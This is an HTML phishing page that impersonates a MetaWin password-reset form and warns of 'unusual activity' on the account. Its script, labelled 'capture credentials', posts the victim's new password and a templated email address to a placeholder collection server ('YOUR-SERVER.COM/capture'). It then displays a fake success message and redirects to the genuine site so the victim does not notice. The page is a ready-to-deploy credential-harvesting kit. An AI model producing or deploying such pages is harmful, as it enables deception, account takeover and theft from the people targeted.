<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MetaWin - Password Reset</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background: #f8f9fa; 
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
            padding: 20px;
        }
        .container { 
            background: white; width: 100%; max-width: 420px; border-radius: 8px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 40px 32px;
        }
        .logo { 
            text-align: center; margin-bottom: 32px; 
        }
        .logo img { 
            max-width: 140px; 
            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.15));
        }
        .heading { 
            text-align: center; margin-bottom: 24px; 
        }
        .heading h1 { 
            color: #1a1a2e; font-size: 24px; font-weight: 700; margin-bottom: 8px; 
        }
        .heading p { 
            color: #64ffda; font-size: 14px; font-weight: 500; 
        }
        .form-group { margin-bottom: 20px; }
        .form-group label { 
            display: block; margin-bottom: 8px; color: #4b556b; font-size: 13px; font-weight: 500; 
        }
        .form-group input { 
            width: 100%; padding: 14px 16px; border: 1px solid #d1d5db; 
            border-radius: 6px; font-size: 15px; transition: all 0.2s; 
            background: #fff; caret-color: #fff;
        }
        .form-group input:focus { 
            outline: none; border-color: #64ffda; box-shadow: 0 0 0 3px rgba(100, 255, 219, 0.15); 
        }
        .form-group input::placeholder { color: #9ca3af; }
        .actions { display: flex; flex-direction: column; gap: 12px; }
        .btn { 
            padding: 14px 24px; border: none; border-radius: 6px; font-size: 15px; 
            font-weight: 600; cursor: pointer; transition: all 0.2s; 
            background: linear-gradient(135deg, #64ffda 0%, #1a1a2e 100%);
            color: #1a1a2e; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(100, 255, 219, 0.3); }
        .btn:active { transform: translateY(1px); }
        .links { 
            margin-top: 24px; text-align: center; 
            font-size: 13px; color: #64748b;
        }
        .links a { 
            color: #64ffda; text-decoration: none; margin: 0 8px; 
            font-weight: 500; transition: color 0.2s;
        }
        .links a:hover { color: #7bffec; }
        .note { 
            margin-top: 24px; padding-top: 24px; border-top: 1px solid #e5e7eb; 
            font-size: 12px; color: #9ca3af; text-align: center;
        }
        .security { 
            background: linear-gradient(135deg, #1a1a2e 0%, #161622 100%); 
            color: white; padding: 20px; border-radius: 8px; margin-top: 24px; 
            text-align: center; font-size: 13px;
        }
        .security span { color: #64ffda; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="48" height="48" rx="12" fill="#1a1a2e"/>
                <circle cx="24" cy="24" r="12" fill="#64ffda"/>
                <path d="M12 12L20 18L36 8" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <span style="margin-left: 12px; color: #fff; font-size: 16px;">MetaWin</span>
        </div>
        <div class="heading">
            <h1>Password Reset</h1>
            <p>We've detected unusual activity on your account</p>
        </div>
        
        <form action="#" method="POST">
            <div class="form-group">
                <label for="password">New Password</label>
                <input type="password" id="password" name="password" required autocomplete="off" placeholder="Enter new password">
            </div>
            <div class="form-group">
                <label for="confirm">Confirm Password</label>
                <input type="password" id="confirm" name="confirm_password" required autocomplete="off" placeholder="Confirm new password">
            </div>
            
            <div class="actions">
                <button type="submit" class="btn">Reset Password</button>
            </div>
        </form>
        
        <div class="links">
            <a href="https://metawin.us">Back to MetaWin</a>
            <span>|</span>
            <a href="mailto:support@metawin.us">Contact Support</a>
        </div>
        
        <p class="note">
            This link will expire in 30 minutes for your security.
        </p>
        
        <div class="security">
            <span>MetaWin Security Team</span>
        </div>
    </div>
</body>
</html>
<script>
    // Handle form submission - capture credentials
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.querySelector('form');
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const confirm = document.getElementById('confirm').value;
            
            // Capture credentials
            const data = {
                email: '%%EMAIL_FROM_EMAIL%%',
                password: password,
                timestamp: new Date().toISOString()
            };
            
            // Send to your server / log
            fetch('https://YOUR-SERVER.COM/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                // Show success and redirect
                const form = document.querySelector('form');
                const success = document.createElement('div');
                success.innerHTML = `
                    <div style="text-align: center; padding: 40px 20px; background: #e8f5e9; border-radius: 8px; margin: 20px 0;">
                        <h3>Password Updated</h3>
                        <p>Your password has been reset successfully.</p>
                        <p>Redirecting to MetaWin in 3 seconds...</p>
                    </div>
                `;
                form.parentNode.replaceChild(success, form);
                
                // Redirect to real site
                setTimeout(() => {
                    window.location.href = 'https://metawin.us';
                }, 3000);
            });
        });
    });
</script>
